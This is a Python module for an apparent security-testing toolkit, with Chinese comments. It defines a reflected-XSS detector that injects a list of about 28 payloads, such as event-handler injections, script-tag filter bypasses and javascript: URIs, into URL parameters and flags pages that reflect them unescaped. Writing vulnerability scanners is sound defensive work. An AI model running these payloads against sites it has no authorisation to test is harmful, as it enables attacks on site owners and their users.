"""XSS 漏洞检测器"""
import re
import time
import urllib.parse
from typing import List
from secops_core.http_client import http_get, http_post
from secops_core.config import ATTACK_DELAY
from secops_offense.attack_engine.finding import Finding
from secops_offense.attack_engine.auth import log_audit
from secops_offense.attack_engine.modules.base import BaseDetector


class XSSDetector(BaseDetector):
    """XSS 漏洞检测器"""

    name = "xss"
    category = "XSS"
    MARKER = "secopsxss"

    PAYLOADS = [
        '"><secopsxss>',
        "'><secopsxss>",
        "<secopsxss>",
        '" onmouseover=alert(1) x="',
        "' onfocus=alert(1) autofocus='",
        '" onfocus=alert(1) autofocus="',
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "JaVaScRiPt:alert(1)",
        "javascript:alert`1`",
        "data:text/html,<script>alert(1)</script>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<img src=1 href=1 onerror='javascript:alert(1)'>",
        "<svg><script>alert&#40;1&#41;</script>",
        '"><img src=x onerror=alert(1)//',
        "<%00script>alert(1)</%00script>",
        "\"><svg onload=alert(1)>",
        "'-alert(1)-'",
        "\\\"-alert(1)//",
    ]

    def test(self, target_url: str, params: list = None, method: str = "GET") -> List[Finding]:
        findings = []

        if params is None:
            parsed = urllib.parse.urlparse(target_url)
            if parsed.query:
                params = list(urllib.parse.parse_qs(parsed.query).keys())
            else:
                params = ["q", "keyword", "search", "id", "name", "input",
                          "text", "content", "message", "page", "redirect",
                          "url", "callback", "next", "return"]

        parsed = urllib.parse.urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for param in params:
            for payload in self.PAYLOADS:
                test_params = {param: payload}
                test_url = f"{base_url}?{urllib.parse.urlencode(test_params)}"

                log_audit("XSS_TEST", test_url, f"param={param}, payload={payload[:50]}")

                if method == "GET":
                    status, headers, body = http_get(test_url)
                else:
                    status, headers, body = http_post(
                        base_url, urllib.parse.urlencode(test_params)
                    )

                if status == 0:
                    continue

                # 1. 原始 payload 完整出现在响应中
                if payload in body and "secopsxss" in payload:
                    findings.append(Finding(
                        vuln_type="XSS", severity="high",
                        title=f"反射型 XSS - 参数 {param}",
                        location=test_url, payload=payload,
                        evidence="Payload 完整出现在响应中，未被转义或过滤",
                        description=f"参数 {param} 的输入未经过滤直接反射到页面。",
                        remediation="对所有用户输入进行 HTML 实体编码，配置 CSP 策略"
                    ))
                    break

                # 2. HTML 标签被解析
                tag_match = re.search(r'<secopsxss[^>]*>', body)
                if tag_match:
                    findings.append(Finding(
                        vuln_type="XSS", severity="high",
                        title=f"反射型 XSS (HTML标签解析) - 参数 {param}",
                        location=test_url, payload=payload,
                        evidence=f"注入的 HTML 标签被浏览器解析: {tag_match.group()}",
                        description=f"参数 {param} 的输入被当作 HTML 解析。",
                        remediation="对所有用户输入进行 HTML 实体编码"
                    ))
                    break

                # 3. 事件处理器注入
                if "onerror=" in payload and 'onerror=' in body and 'alert(' in body:
                    if re.search(r'onerror\s*=\s*alert', body):
                        findings.append(Finding(
                            vuln_type="XSS", severity="high",
                            title=f"反射型 XSS (事件处理器注入) - 参数 {param}",
                            location=test_url, payload=payload,
                            evidence="onerror 事件处理器被保留在 HTML 标签中",
                            description=f"参数 {param} 允许注入 HTML 事件处理器。",
                            remediation="过滤 HTML 属性中的事件处理器关键词"
                        ))
                        break

                time.sleep(ATTACK_DELAY)

        return findings
